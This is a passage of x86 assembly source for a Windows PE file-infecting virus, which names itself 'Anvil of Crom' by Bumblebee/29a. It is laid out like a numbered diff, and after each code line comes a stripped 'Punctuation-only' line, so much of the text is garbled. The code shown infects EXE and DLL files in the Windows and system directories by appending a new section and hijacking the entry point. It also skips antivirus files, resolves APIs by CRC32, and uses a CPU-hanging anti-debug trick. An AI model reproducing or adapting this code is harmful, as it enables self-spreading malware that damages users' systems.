+00809:         rep     cmpsb                           ; scan the same dir twice
+00810: Pnct:                                                                                 ;          
+00811:         je      goOut                           ; (not scan windows\system)
+00812: Pnct:                                                                                   ;   (     \ )
+00813:         lea     esi,tempPath+ebp                ; change to windows dir
+00814: Pnct:                           , +                                 ;        
+00815:         push    esi
+00816: Pnct:                        
+00817:         call    dword ptr [_SetCurrentDirectoryA+ebp]
+00818: Pnct:                             [ _ + ]
+00819:         xor     eax,eax
+00820: Pnct:                           ,
+00821:         call    infectDir                       ; search for dll
+00822: Pnct:                                                                       ;      
+00823: goSystemDir:
+00824: Pnct: :
+00825:         push    pathSize                        ; get system directory
+00826: Pnct:                                                                         ;      
+00827:         lea     esi,tempPath+ebp
+00828: Pnct:                           , +
+00829:         push    esi
+00830: Pnct:                        
+00831:         call    dword ptr [_GetSystemDirectoryA+ebp]
+00832: Pnct:                             [ _ + ]
+00833:         or      eax,eax
+00834: Pnct:                             ,
+00835:         jz      goHomeYankie
+00836: Pnct:                            
+00837:         mov     ecx,eax                         ; test if we are in sys
+00838: Pnct:                           ,                                                   ;            
+00839:         lea     edi,currentPath+ebp             ; directory to avoid
+00840: Pnct:                           , +                           ;      
+00841:         rep     cmpsb                           ; scan the same dir twice
+00842: Pnct:                                                                                 ;          
+00843:         je      goHomeYankie
+00844: Pnct:                            
+00845:         lea     esi,tempPath+ebp                ; change to system dir
+00846: Pnct:                           , +                                 ;        
+00847:         push    esi
+00848: Pnct:                        
+00849:         call    dword ptr [_SetCurrentDirectoryA+ebp]
+00850: Pnct:                             [ _ + ]
+00851:         xor     eax,eax
+00852: Pnct:                           ,
+00853:         call    infectDir                       ; search for dll
+00854: Pnct:                                                                       ;      
+00855: goHomeYankie:
+00856: Pnct: :
+00857:         lea     esi,currentPath+ebp             ; return to our directory ;)
+00858: Pnct:                           , +                           ;           ; )
+00859:         push    esi
+00860: Pnct:                        
+00861:         call    dword ptr [_SetCurrentDirectoryA+ebp]
+00862: Pnct:                             [ _ + ]
+00863: littleCrypt5:                                   ; for LENDE
+00864: Pnct: :                                                                       ;    
+00865: littleCrypt3:                                   ; for LENDE
+00866: Pnct: :                                                                       ;    
+00867: goOut:
+00868: Pnct: :
+00869:         lea     edi,inicio+ebp                  ; setup the jump
+00870: Pnct:                           , +                                     ;      
+00871:         pop     esi                             ; back to host
+00872: Pnct:                                                                                     ;      
+00873:         sub     edi,esi                         ; i take care of
+00874: Pnct:                           ,                                                   ;        
+00875:         pop     esi                             ; the relocations
+00876: Pnct:                                                                                     ;    
+00877:         add     esi,edi
+00878: Pnct:                           ,
+00879:         mov     dword ptr [jmpBack+ebp],esi
+00880: Pnct:                               [ + ] ,
+00881: ;
+00882: Pnct: ;
+00883: ; How to do a relocation? I save the address that must have my 'inicio'
+00884: Pnct: ;           ?                   ' '
+00885: ; address at infection time. Later, at execution time, i get the actual
+00886: Pnct: ;         .   ,       ,        
+00887: ; address of 'inicio' and sub the fixed address. The result is the
+00888: Pnct: ;       ' '           .        
+00889: ; value i must add to the host old EP to get the new address. I know
+00890: Pnct: ;                             .    
+00891: ; this can be done in other way, like adding a new bank in the reloc
+00892: Pnct: ;               ,                
+00893: ; section of the PE... If you don't take care of this you cannot rely
+00894: Pnct: ;         . . .       '              
+00895: ; in a 'push <addres> ret'. May be is only theory with EXEs, but a file
+00896: Pnct: ;       '   < >   ' .               ,      
+00897: ; not-fixed and/or with relocations can be loaded in different plazes
+00898: Pnct: ;   -   /                
+00899: ; than its Image Base. Using this push/ret jump the return address is not
+00900: Pnct: ;         .       /            
+00901: ; calculated 'till execution time... hard for an emulator? In the file
+00902: Pnct: ;     '     . . .         ?      
+00903: ; you'll see forever and ever: push 00000000h/ret. Relocation is NEEDED
+00904: Pnct: ;   '         :     / .      
+00905: ; with DLL with the push/ret jump. If file not relocated the Image Base
+00906: Pnct: ;           /   .              
+00907: ; is the same than Image Base got in execution time, so the sub is zero
+00908: Pnct: ;                     ,          
+00909: ; and adding zero to the Host EP we have no change.
+00910: Pnct: ;                       .
+00911: ;
+00912: Pnct: ;
+00913: ; Moreover we need to patch the virus 'inicio' 'cause DLL code runs another
+00914: Pnct: ;                 ' '   '        
+00915: ; time when is unloaded and we want to run virus once due to the way of
+00916: Pnct: ;                                
+00917: ; infection... with another method we could infect at unload too, or only
+00918: Pnct: ;   . . .                   ,    
+00919: ; at unload. May be next time ;)
+00920: Pnct: ;     .           ; )
+00921: ;
+00922: Pnct: ;
+00923:         lea     esi,patchVirus+ebp              ; patch our virus:
+00924: Pnct:                           , +                             ;       :
+00925:         lea     edi,inicio+ebp                  ; just copy our jump to
+00926: Pnct:                           , +                                     ;          
+00927:         mov     ecx,patchSize                   ; host at the begining
+00928: Pnct:                           ,                                       ;        
+00929:         rep     movsb
+00930: Pnct:                          
+00931:         popad                                   ; restore regs
+00932: Pnct:                                                                                       ;    
+00933: patchVirus:
+00934: Pnct: :
+00935:         db      68h                             ; push hardcoded
+00936: Pnct:                                                                                       ;    
+00937: jmpBack:
+00938: Pnct: :
+00939:         dd      0
+00940: Pnct:                            
+00941:         ret                                     ; jump back to host
+00942: Pnct:                                                                                           ;        
+00943: patchSize       equ     offset $-offset patchVirus
+00944: Pnct:                           $ -  
+00945: DamnException:                                  ; fuck! next time...
+00946: Pnct: :                                                                     ;   !     . . .
+00947:         xor     esi,esi
+00948: Pnct:                           ,
+00949:         mov     eax,dword ptr fs:[esi]
+00950: Pnct:                           ,     : [ ]
+00951:         mov     esp,dword ptr [eax]
+00952: Pnct:                           ,     [ ]
+00953:         call    deltaExcept0
+00954: Pnct:                        
+00955: deltaExcept0:                                   ; get delta another time
+00956: Pnct: :                                                                       ;        
+00957:         pop     ebp
+00958: Pnct:                          
+00959:         sub     ebp,offset deltaExcept0
+00960: Pnct:                           ,  
+00961:         jmp     goOut
+00962: Pnct:                          
+00963: ; This is the data that must travel with the virus... the rest is
+00964: Pnct: ;                     . . .      
+00965: ; only temporary buffer...
+00966: Pnct: ;       . . .
+00967: ; some strings to test if the virus is about to infect an av prog
+00968: Pnct: ;                            
+00969: avStrings       dw      'VA','NA','RD','RE','DO','BT','-F'
+00970: Pnct:                           ' ' , ' ' , ' ' , ' ' , ' ' , ' ' , ' - '
+00971: vStringsCout    equ     (offset $-offset avStrings)/2
+00972: Pnct:                   (   $ -   ) /
+00973: ; needed for file search ---------------------------------------------------
+00974: Pnct: ;           - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+00975: exeMask                 db      '*.exe',0       ; mask to find exe files
+00976: Pnct:                                               ' * . ' ,               ;          
+00977: dllMask                 db      '*.dll',0       ; mask to find dll files
+00978: Pnct:                                               ' * . ' ,               ;          
+00979: maskSize                equ     offset $-offset dllMask
+00980: Pnct:                                             $ -  
+00981: ; --------------------------------------------------------------------------
+00982: Pnct: ;   - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+00983: ; copyright ----------------------------------------------------------------
+00984: Pnct: ;     - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+00985: sname   db      '< [AOC] - Anvil of Crom virus Coded by Bumblebee/29a >'
+00986: Pnct:                   ' <   [ ]   -               /   > '
+00987: messSize equ    offset $-offset sname
+00988: Pnct:             $ -  
+00989: ; --------------------------------------------------------------------------
+00990: Pnct: ;   - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+00991: ; CRC32 and plaze to store APIs used ---------------------------------------
+00992: Pnct: ;                 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+00993: FSTAPI                  label   byte
+00994: Pnct:                                          
+00995: CrcCreateFileA          dd      08c892ddfh
+00996: Pnct:                                
+00997: size0                   db      12
+00998: Pnct:                                                  
+00999: _CreateFileA            dd      0
+01000: Pnct: _                                    
+01001: CrcMapViewOfFile        dd      0797b49ech
+01002: Pnct:                            
+01003: size1                   db      14
+01004: Pnct:                                                  
+01005: _MapViewOfFile          dd      0
+01006: Pnct: _                                
+01007: CrcCreatFileMappingA    dd      096b2d96ch
+01008: Pnct:                    
+01009: size2                   db      19
+01010: Pnct:                                                  
+01011: _CreateFileMappingA     dd      0
+01012: Pnct: _                      
+01013: CrcUnmapViewOfFile      dd      094524b42h
+01014: Pnct:                        
+01015: size3                   db      16
+01016: Pnct:                                                  
+01017: _UnmapViewOfFile        dd      0
+01018: Pnct: _                            
+01019: CrcCloseHandle          dd      068624a9dh
+01020: Pnct:                                
+01021: size4                   db      12
+01022: Pnct:                                                  
+01023: _CloseHandle            dd      0
+01024: Pnct: _                                    
+01025: CrcGetFileTime          dd      04434e8feh
+01026: Pnct:                                
+01027: size5                   db      12
+01028: Pnct:                                                  
+01029: _GetFileTime            dd      0
+01030: Pnct: _                                    
+01031: CrcSetFileTime          dd      04b2a3e7dh
+01032: Pnct:                                
+01033: size6                   db      12
+01034: Pnct:                                                  
+01035: _SetFileTime            dd      0
+01036: Pnct: _                                    
+01037: CrcSetFileAttributesA   dd      03c19e536h
+01038: Pnct:                  
+01039: size7                   db      19
+01040: Pnct:                                                  
+01041: _SetFileAttributesA     dd      0
+01042: Pnct: _                      
+01043: CrcGetFileAttributesA   dd      0c633d3deh
+01044: Pnct:                  
+01045: size8                   db      19
+01046: Pnct:                                                  
+01047: _GetFileAttributesA     dd      0
+01048: Pnct: _                      
+01049: CrcFindFirstFileA       dd      0ae17ebefh
+01050: Pnct:                          
+01051: size9                   db      15
+01052: Pnct:                                                  
+01053: _FindFirstFileA         dd      0
+01054: Pnct: _                              
+01055: CrcFindNextFileA        dd      0aa700106h
+01056: Pnct:                            
+01057: size10                  db      14
+01058: Pnct:                                                
+01059: _FindNextFileA          dd      0
+01060: Pnct: _                                
+01061: CrcFindClose            dd      0c200be21h
+01062: Pnct:                                    
+01063: size11                  db      10
+01064: Pnct:                                                
+01065: _FindClose              dd      0
+01066: Pnct: _                                        
+01067: CrcGetCurrentDirectoryA dd      0ebc6c18bh
+01068: Pnct:              
+01069: size12                  db      21
+01070: Pnct:                                                
+01071: _GetCurrentDirectoryA   dd      0
+01072: Pnct: _                  
+01073: CrcSetCurrentDirectoryA dd      0b2dbd7dch
+01074: Pnct:              
+01075: size13                  db      21
+01076: Pnct:                                                
+01077: _SetCurrentDirectoryA   dd      0
+01078: Pnct: _                  
+01079: CrcGetWindowsDirectoryA dd      0fe248274h
+01080: Pnct:              
+01081: size14                  db      21
+01082: Pnct:                                                
+01083: _GetWindowsDirectoryA   dd      0
+01084: Pnct: _                  
+01085: CrcGetSystemDirectoryA  dd      0593ae7ceh
+01086: Pnct:                
+01087: size15                  db      20
+01088: Pnct:                                                
+01089: _GetSystemDirectoryA    dd      0
+01090: Pnct: _                    
+01091: CrcGetTickCount         dd      0613fd7bah
+01092: Pnct:                              
+01093: size16                  db      13
+01094: Pnct:                                                
+01095: _GetTickCount           dd      0
+01096: Pnct: _                                  
+01097: CrcAllocConsole         dd      031998e82h
+01098: Pnct:                              
+01099: size17                  db      13
+01100: Pnct:                                                
+01101: _AllocConsole           dd      0
+01102: Pnct: _                                  
+01103: CrcGetStdHandle         dd      0e50009f4h
+01104: Pnct:                              
+01105: size18                  db      13
+01106: Pnct:                                                
+01107: _GetStdHandle           dd      0
+01108: Pnct: _                                  
+01109: CrcWriteConsoleA        dd      0f01c7323h
+01110: Pnct:                            
+01111: size19                  db      14
+01112: Pnct:                                                
+01113: _WriteConsoleA          dd      0
+01114: Pnct: _                                
+01115: ENDAPI                  label   byte
+01116: Pnct:                                          
+01117: ; --------------------------------------------------------------------------
+01118: Pnct: ;   - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+01119: ;
+01120: Pnct: ;
+01121: ; scan kernel stuff with SEH (input esi: K32 addr to scan)
+01122: Pnct: ;             (   :         )
+01123: ;
+01124: Pnct: ;
+01125: ; Darkman, you're right. Why not? now i can include W2K stuff ;)
+01126: Pnct: ;   ,   '   .     ?               ; )
+01127: ;
+01128: Pnct: ;
+01129: scanK32:
+01130: Pnct: :
+01131:         pushad                                  ; save all
+01132: Pnct:                                                                                     ;    
+01133:         lea     eax,dword ptr [esp-8h]          ; setup SEH
+01134: Pnct:                           ,     [ - ]                     ;    
+01135:         xor     edi,edi
+01136: Pnct:                           ,
+01137:         xchg    eax,dword ptr fs:[edi]
+01138: Pnct:                         ,     : [ ]
+01139:         lea     edi,scanException+ebp           ; addr to jump if Execption
+01140: Pnct:                           , +                       ;          
+01141:         push    edi
+01142: Pnct:                        
+01143:         push    eax
+01144: Pnct:                        
+01145:         xor     edi,edi
+01146: Pnct:                           ,
+01147:         call    imBeingDebugged                 ; SEH does anti-debug trick
+01148: Pnct:                                                           ;       -  
+01149:                                                 ; debugger step by step: KO
+01150: Pnct:                                                                                                 ;         :  
+01151: imBeingDebugged:
+01152: Pnct: :
+01153:         cmp     edi,dword ptr fs:[edi+20h]      ; we are being debugged?
+01154: Pnct:                           ,     : [ + ]             ;         ?
+01155:         je      notDebuged
+01156: Pnct:                            
+01157: fool:
+01158: Pnct: :
+01159:         cli
+01160: Pnct:                
+01161:         wbinvd
+01162: Pnct:                
+01163:         call    fool                            ; pseh... can be better
+01164: Pnct:                                                                                 ;   . . .      
+01165: notDebuged:
+01166: Pnct: :
+01167:         add     esp,4
+01168: Pnct:                           ,
+01169:         cmp     word ptr [esi],'ZM'             ; is an exe?
+01170: Pnct:                               [ ] , ' '                           ;       ?
+01171:         jne     scanNotFound
+01172: Pnct:                          
+01173:         xor     esi,esi                         ; quit SEH
+01174: Pnct:                           ,                                                   ;    
+01175:         pop     dword ptr fs:[esi]
+01176: Pnct:                               : [ ]
+01177:         pop     eax
+01178: Pnct:                          
+01179:         popad                                   ; restore all
+01180: Pnct:                                                                                       ;    
+01181:         clc                                     ; may be K32 ;)
+01182: Pnct:                                                                                           ;         ; )
+01183:         ret
+01184: Pnct:                
+01185: scanException:                                  ; oh
+01186: Pnct: :                                                                     ;  
+01187:         xor     esi,esi
+01188: Pnct:                           ,
+01189:         mov     eax,dword ptr fs:[esi]
+01190: Pnct:                           ,     : [ ]
+01191:         mov     esp,dword ptr [eax]
+01192: Pnct:                           ,     [ ]
+01193:         call    deltaExcept
+01194: Pnct:                        
+01195: deltaExcept:                                    ; get delta another time
+01196: Pnct: :                                                                         ;        
+01197:         pop     ebp
+01198: Pnct:                          
+01199:         sub     ebp,offset deltaExcept
+01200: Pnct:                           ,  
+01201: scanNotFound:
+01202: Pnct: :
+01203:         xor     esi,esi                         ; quit SEH
+01204: Pnct:                           ,                                                   ;    
+01205:         pop     dword ptr fs:[esi]
+01206: Pnct:                               : [ ]
+01207:         pop     eax
+01208: Pnct:                          
+01209:         popad                                   ; restore all
+01210: Pnct:                                                                                       ;    
+01211:         stc                                     ; sure is not K32 :(
+01212: Pnct:                                                                                           ;           : (
+01213:         ret
+01214: Pnct:                
+01215: endScanK32:
+01216: Pnct: :
+01217: ;
+01218: Pnct: ;
+01219: ; CRC32
+01220: Pnct: ;  
+01221: ;
+01222: Pnct: ;
+01223: ;  IN:  esi     offset of data to do CRC32
+01224: Pnct: ;     :                        
+01225: ;       edi     size to do CRC32
+01226: Pnct: ;                              
+01227: ;
+01228: Pnct: ;
+01229: ;  OUT:
+01230: Pnct: ;     :
+01231: ;       eax     CRC32
+01232: Pnct: ;                        
+01233: ;
+01234: Pnct: ;
+01235: ; Original routine by Vecna. Gracias!
+01236: Pnct: ;         .   !
+01237: ;
+01238: Pnct: ;
+01239: CRC32:
+01240: Pnct: :
+01241: 	cld
+01242: Pnct: 	
+01243:         xor     ecx,ecx
+01244: Pnct:                           ,
+01245:         dec     ecx
+01246: Pnct:                          
+01247: 	mov     edx,ecx
+01248: Pnct: 	           ,
+01249: 	push    ebx
+01250: Pnct: 	        
+01251: NextByteCRC:
+01252: Pnct: :
+01253: 	xor     eax,eax
+01254: Pnct: 	           ,
+01255: 	xor     ebx,ebx
+01256: Pnct: 	           ,
+01257: 	lodsb
+01258: Pnct: 	
+01259: 	xor     al,cl
+01260: Pnct: 	           ,
+01261: 	mov     cl,ch
+01262: Pnct: 	           ,
+01263: 	mov     ch,dl
+01264: Pnct: 	           ,
+01265: 	mov     dl,dh
+01266: Pnct: 	           ,
+01267: 	mov     dh,8
+01268: Pnct: 	           ,
+01269: NextBitCRC:
+01270: Pnct: :
+01271: 	shr     bx,1
+01272: Pnct: 	           ,
+01273: 	rcr     ax,1
+01274: Pnct: 	           ,
+01275: 	jnc     NoCRC
+01276: Pnct: 	          
+01277: 	xor     ax,08320h
+01278: Pnct: 	           ,
+01279: 	xor     bx,0EDB8h
+01280: Pnct: 	           ,
+01281: NoCRC:
+01282: Pnct: :
+01283:         dec     dh
+01284: Pnct:                          
+01285: 	jnz     NextBitCRC
+01286: Pnct: 	          
+01287: 	xor     ecx,eax
+01288: Pnct: 	           ,
+01289: 	xor     edx,ebx
+01290: Pnct: 	           ,
+01291:         dec     edi
+01292: Pnct:                          
+01293: 	jnz     NextByteCRC
+01294: Pnct: 	          
+01295: 	pop     ebx
+01296: Pnct: 	          
+01297: 	not     edx
+01298: Pnct: 	          
+01299: 	not     ecx
+01300: Pnct: 	          
+01301: 	mov     eax,edx
+01302: Pnct: 	           ,
+01303: 	rol     eax,16
+01304: Pnct: 	           ,
+01305: 	mov     ax,cx
+01306: Pnct: 	           ,
+01307: 	ret
+01308: Pnct: 	
+01309: countGen        dd      0                       ; for payload activation
+01310: Pnct:                                                                           ;      
+01311: ;
+01312: Pnct: ;
+01313: ; infection process adding new section (esi zstring of file to infect)
+01314: Pnct: ;             (           )
+01315: ;
+01316: Pnct: ;
+01317: ; some stuff (section):
+01318: Pnct: ;       ( ) :
+01319: ;
+01320: Pnct: ;
+01321: ;   Plaze      Length       Desc
+01322: Pnct: ;                                
+01323: ;    00h        08h          Name of the baby
+01324: Pnct: ;                                                  
+01325: ;    08h        04h          virtual size (size to allocate)
+01326: Pnct: ;                                                 (     )
+01327: ;    0ch        04h          RVA (relative virtual adress)
+01328: Pnct: ;                                               (     )
+01329: ;    10h        04h          phys size (less or equal to virtSize)
+01330: Pnct: ;                                                 (         )
+01331: ;    14h        04h          phys offset (offset from bof of the section)
+01332: Pnct: ;                                                 (           )
+01333: ;    1ch        0ch          shit, shit, shit
+01334: Pnct: ;                                             ,   ,  
+01335: ;    24h        04h          Properties of the baby (we want CERW)
+01336: Pnct: ;                                                     (     )
+01337: ;
+01338: Pnct: ;
+01339: ; this is our section
+01340: Pnct: ;        
+01341: sect            db      '.ntext',0,0
+01342: Pnct:                                     ' . ' , ,
+01343: sVirtSize       dd      (((vSize+sizeOfBuffer)/1000h)+1)*1000h ; align to 4kb
+01344: Pnct:                           ( ( ( + ) / ) + ) *   ;      
+01345: sRVA            dd      0
+01346: Pnct:                                    
+01347: sPhysSize       dd      0
+01348: Pnct:                          
+01349: sPhysOffs       dd      0
+01350: Pnct:                          
+01351: sShit           db      0ch dup (0)
+01352: Pnct:                                       ( )
+01353: sProper         dd      0e0000020h
+01354: Pnct:                              
+01355: infection:
+01356: Pnct: :
+01357:         mov     dword ptr [fNameAddr+ebp],esi   ; for laaater use
+01358: Pnct:                               [ + ] ,       ;      
+01359:         pushad                                  ; save all
+01360: Pnct:                                                                                     ;    
+01361:         lea     eax,dword ptr [esp-8h]          ; setup SEH
+01362: Pnct:                           ,     [ - ]                     ;    
+01363:         xor     edi,edi
+01364: Pnct:                           ,
+01365:         xchg    eax,dword ptr fs:[edi]
+01366: Pnct:                         ,     : [ ]
+01367:         lea     edi,infException+ebp
+01368: Pnct:                           , +
+01369:         push    edi
+01370: Pnct:                        
+01371:         push    eax
+01372: Pnct:                        
+01373:         push    esi
+01374: Pnct:                        
+01375:         push    esi
+01376: Pnct:                        
+01377:         call    dword ptr [_GetFileAttributesA+ebp]
+01378: Pnct:                             [ _ + ]
+01379:         pop     esi
+01380: Pnct:                          
+01381:         inc     eax
+01382: Pnct:                          
+01383:         jz      infectionError                  ; get file attributes
+01384: Pnct:                                                                 ;      
+01385:         dec     eax
+01386: Pnct:                          
+01387:         mov     dword ptr [fileAttrib+ebp],eax  ; save to restore later
+01388: Pnct:                               [ + ] ,     ;        
+01389:         push    esi
+01390: Pnct:                        
+01391:         push    00000080h
+01392: Pnct:                        
+01393:         push    esi
+01394: Pnct:                        
+01395:         call    dword ptr [_SetFileAttributesA+ebp]
+01396: Pnct:                             [ _ + ]
+01397:         pop     esi
+01398: Pnct:                          
+01399:         or      eax,eax
+01400: Pnct:                             ,
+01401:         jz      infectionError                  ; clear attributes
+01402: Pnct:                                                                 ;    
+01403:         xor     eax,eax
+01404: Pnct:                           ,
+01405:         push    eax
+01406: Pnct:                        
+01407:         push    00000080h
+01408: Pnct:                        
+01409:         push    00000003h
+01410: Pnct:                        
+01411:         push    eax
+01412: Pnct:                        
+01413:         push    eax
+01414: Pnct:                        
+01415:         push    80000000h OR 40000000h
+01416: Pnct:                            
+01417:         push    esi
+01418: Pnct:                        
+01419:         call    dword ptr [_CreateFileA+ebp]    ; open the file not shared
+01420: Pnct:                             [ _ + ]         ;          
+01421:         inc     eax                             ; read write
+01422: Pnct:                                                                                     ;    
+01423:         jz      infectionErrorAttrib
+01424: Pnct:                            
+01425:         dec     eax
+01426: Pnct:                          
+01427:         mov     dword ptr [fHnd+ebp],eax        ; save file handle
+01428: Pnct:                               [ + ] ,                 ;      
+01429:         lea     edi,fileTime2+ebp
+01430: Pnct:                           , +
+01431:         push    edi
+01432: Pnct:                        
+01433:         lea     edi,fileTime1+ebp
+01434: Pnct:                           , +
+01435:         push    edi
+01436: Pnct:                        
+01437:         lea     edi,fileTime0+ebp
+01438: Pnct:                           , +
+01439:         push    edi
+01440: Pnct:                        
+01441:         push    eax
+01442: Pnct:                        
+01443:         call    dword ptr [_GetFileTime+ebp]
+01444: Pnct:                             [ _ + ]
+01445:         or      eax,eax
+01446: Pnct:                             ,
+01447:         jz      infectionErrorClose             ; get file time
+01448: Pnct:                                                       ;      
+01449:         xor     eax,eax
+01450: Pnct:                           ,
+01451:         push    eax
+01452: Pnct:                        
+01453:         push    eax
+01454: Pnct:                        
+01455:         push    eax
+01456: Pnct:                        
+01457:         push    00000004h
+01458: Pnct:                        
+01459:         push    eax
+01460: Pnct:                        
+01461:         push    dword ptr [fHnd+ebp]
+01462: Pnct:                             [ + ]
+01463:         call    dword ptr [_CreateFileMappingA+ebp]
+01464: Pnct:                             [ _ + ]
+01465:         or      eax,eax                         ; create a mapping file
+01466: Pnct:                             ,                                                   ;        
+01467:         jz      infectionErrorClose             ; for read/write
+01468: Pnct:                                                       ;     /
+01469:         mov     dword ptr [fhmap+ebp],eax       ; save
+01470: Pnct:                               [ + ] ,               ;  
+01471:         xor     eax,eax
+01472: Pnct:                           ,
+01473:         push    eax
+01474: Pnct:                        
+01475:         push    eax
+01476: Pnct:                        
+01477:         push    eax
+01478: Pnct:                        
+01479:         push    00000004h OR 00000002h
+01480: Pnct:                            
+01481:         push    dword ptr [fhmap+ebp]
+01482: Pnct:                             [ + ]
+01483:         call    dword ptr [_MapViewOfFile+ebp]  ; create map view (r/w)
+01484: Pnct:                             [ _ + ]     ;         ( / )
+01485:         or      eax,eax
+01486: Pnct:                             ,
+01487:         jz      infectionErrorCloseMap
+01488: Pnct:                            
+01489:         mov     dword ptr [mapMem+ebp],eax      ; save
+01490: Pnct:                               [ + ] ,             ;  
+01491:         mov     edi,eax
+01492: Pnct:                           ,
+01493:         cmp     word ptr [edi],'ZM'             ; test if EXE
+01494: Pnct:                               [ ] , ' '                           ;      
+01495:         jne     infectionErrorCloseUnmap
+01496: Pnct:                          
+01497:         add     edi,dword ptr [edi+3ch]         ; test if PE
+01498: Pnct:                           ,     [ + ]                   ;      
+01499:         cmp     word ptr [edi],'EP'
+01500: Pnct:                               [ ] , ' '
+01501:         jne     infectionErrorCloseUnmap
+01502: Pnct:                          
+01503:         mov     edx,edi                         ; save for later use
+01504: Pnct:                           ,                                                   ;        
+01505:         cmp     dword ptr [edx+28h],0           ; this is not dumb
+01506: Pnct:                               [ + ] ,                       ;        
+01507:         je      infectionErrorCloseUnmap        ; check for DLL
+01508: Pnct:                                             ;      
+01509:         mov     esi,edi                         ; skip image header and
+01510: Pnct:                           ,                                                   ;        
+01511:         mov     eax,18h                         ; optional header
+01512: Pnct:                           ,                                                   ;    
+01513:         add     ax,word ptr [edi+14h]
+01514: Pnct:                           ,     [ + ]
+01515:         add     edi,eax
+01516: Pnct:                           ,
+01517:         push    edx
+01518: Pnct:                        
+01519:         mov     cx,word ptr [esi+06h]           ; search end of last
+01520: Pnct:                           ,     [ + ]                       ;        
+01521:         mov     ax,28h                          ; section desc -1
+01522: Pnct:                           ,                                                     ;       -
+01523:         dec     cx
+01524: Pnct:                          
+01525:         mul     cx
+01526: Pnct:                          
+01527:         add     edi,eax
+01528: Pnct:                           ,
+01529:         pop     edx
+01530: Pnct:                          
+01531:         mov     eax,dword ptr [edx+60h]         ; setup the stack for our
+01532: Pnct:                           ,     [ + ]                   ;          
+01533:         cmp     eax,40000h                      ; poly engine
+01534: Pnct:                           ,                                             ;    
+01535:         ja      reservedStackOK                 ; we do a lot of pushs and
+01536: Pnct:                                                               ;              
+01537:         mov     eax,40000h                      ; i've noticed stack errors
+01538: Pnct:                           ,                                             ;   '      
+01539:         mov     dword ptr [edx+60h],eax         ; so this will avoid them
+01540: Pnct:                               [ + ] ,                   ;          
+01541: reservedStackOK:
+01542: Pnct: :
+01543:         mov     eax,dword ptr [edx+64h]
+01544: Pnct:                           ,     [ + ]
+01545:         cmp     eax,40000h
+01546: Pnct:                           ,
+01547:         ja      commitedStakOK
+01548: Pnct:                            
+01549:         mov     eax,40000h
+01550: Pnct:                           ,
+01551:         mov     dword ptr [edx+64h],eax
+01552: Pnct:                               [ + ] ,
+01553: commitedStakOK:
+01554: Pnct: :
+01555:         mov     eax,dword ptr [edi+10h]
+01556: Pnct:                           ,     [ + ]
+01557:         add     eax,dword ptr [edi+14h]
+01558: Pnct:                           ,     [ + ]
+01559:         mov     dword ptr [fileSize+ebp],eax    ; we do fix
+01560: Pnct:                               [ + ] ,         ;      
+01561:         mov     dword ptr [sPhysOffs+ebp],eax   ; the end of section is the
+01562: Pnct:                               [ + ] ,       ;            
+01563:                                                 ; the begining of the new
+01564: Pnct:                                                                                                 ;          
+01565:                                                 ; section we add (physically)
+01566: Pnct:                                                                                                 ;         ( )
+01567:         mov     eax,dword ptr [edi+0ch]         ; calc our RVA looking
+01568: Pnct:                           ,     [ + ]                   ;        
+01569:         add     eax,dword ptr [edi+08h]         ; in the actual
+01570: Pnct:                           ,     [ + ]                   ;      
+01571:                                                 ; last section
+01572: Pnct:                                                                                                 ;    
+01573:         push    edx                             ; calc the new obj align:
+01574: Pnct:                                                                                   ;           :
+01575:         mov     ecx,dword ptr [edx+38h]         ; get obj aligment
+01576: Pnct:                           ,     [ + ]                   ;      
+01577:         xor     edx,edx
+01578: Pnct:                           ,
+01579:         div     ecx                             ; div RVA/aligment
+01580: Pnct:                                                                                     ;     /
+01581:         inc     eax                             ; plus one
+01582: Pnct:                                                                                     ;    
+01583:         xor     edx,edx
+01584: Pnct:                           ,
+01585:         mul     ecx                             ; mul by aligment
+01586: Pnct:                                                                                     ;      
+01587:         pop     edx
+01588: Pnct:                          
+01589:         mov     dword ptr [sRVA+ebp],eax
+01590: Pnct:                               [ + ] ,
+01591: ; Notice i don't test if the last section description is the last section
+01592: Pnct: ;       '                    
+01593: ; in the array of sections, like Qozah explains (hey! how are you man?).
+01594: Pnct: ;           ,         ( !         ? ) .
+01595: ; So this can fake the file... but as far as i know the linker ever puts
+01596: Pnct: ;             . . .                    
+01597: ; the sections desc in order, else...
+01598: Pnct: ;           ,   . . .
+01599:         add     edi,28h                         ; goto end of last section
+01600: Pnct:                           ,                                                   ;          
+01601:         push    edi esi
+01602: Pnct:                          
+01603:         mov     ecx,28h                         ; test if there is space
+01604: Pnct:                           ,                                                   ;          
+01605:         xor     eax,eax                         ; for a new section
+01606: Pnct:                           ,                                                   ;        
+01607:         rep     scasb
+01608: Pnct:                          
+01609:         pop     esi edi
+01610: Pnct:                            
+01611:         jnz     infectionErrorCloseUnmap
+01612: Pnct:                          
+01613:         inc     word ptr [esi+06h]              ; add a new section ;)
+01614: Pnct:                               [ + ]                             ;           ; )
+01615:         push    edi                             ; store new ep and get old
+01616: Pnct:                                                                                   ;            
+01617:         mov     edi,dword ptr [sRVA+ebp]        ; set edi=new ep
+01618: Pnct:                           ,     [ + ]                 ;     =  
+01619:         push    edi
+01620: Pnct:                        
+01621:         add     edi,dword ptr [esi+34h]         ; setup our reloc ;)
+01622: Pnct:                           ,     [ + ]                   ;         ; )
+01623:         mov     dword ptr [reloc+ebp],edi       ; needed for return back
+01624: Pnct:                               [ + ] ,               ;        
+01625:         pop     edi                             ; to host if relocation
+01626: Pnct:                                                                                     ;        
+01627:         xchg    edi,dword ptr [esi+28h]         ; get host IP and set
+01628: Pnct:                         ,     [ + ]                   ;          
+01629:         add     edi,dword ptr [esi+34h]         ; new
+01630: Pnct:                           ,     [ + ]                   ;  
+01631:         mov     dword ptr [hostEP+ebp],edi      ; save it
+01632: Pnct:                               [ + ] ,             ;    
+01633:         pop     edi
+01634: Pnct:                          
+01635:         push    edx                             ; calc the new section size:
+01636: Pnct:                                                                                   ;           :
+01637:         mov     eax,dword ptr [gensize+ebp]     ; get virus generated size
